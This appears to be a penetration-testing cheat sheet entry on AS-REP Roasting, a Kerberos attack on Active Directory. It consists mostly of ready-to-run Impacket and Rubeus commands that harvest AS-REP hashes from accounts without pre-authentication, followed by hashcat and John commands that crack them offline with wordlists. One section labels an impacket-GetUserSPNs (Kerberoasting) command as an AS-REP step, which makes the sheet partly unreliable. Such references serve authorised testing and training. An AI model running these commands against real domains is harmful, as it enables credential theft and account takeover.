---
title: AS-REP Roasting
category: ad
subcategory: ad-attacks
os: linux, windows
command: impacket-GetNPUsers domain/ -dc-ip target -usersfile users.txt
tools: impacket-GetNPUsers, Rubeus, hashcat
---


Targets users with Kerberos pre-authentication disabled.

### Impacket

```bash
impacket-GetNPUsers -format john -dc-ip forest -usersfile users.lst htb.local/forest
impacket-GetNPUsers test.local/ -dc-ip 10.10.10.1 -usersfile usernames.txt -outputfile hashes.txt
```

### Authenticated dump (find vulnerable users automatically)

```bash
impacket-GetUserSPNs -dc-ip 192.168.50.70 -outputfile hashes.asreproast -request corp.com/pete
```

### Rubeus (from Windows)

```cmd
.\Rubeus.exe asreproast /nowrap
.\Rubeus.exe asreproast /outfile:hashes.txt
```

### Crack with hashcat (mode 18200)

```bash
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### Crack with john

```bash
john asrep.txt --wordlist=/root/Desktop/AD-Lab/PasswordList.txt
```
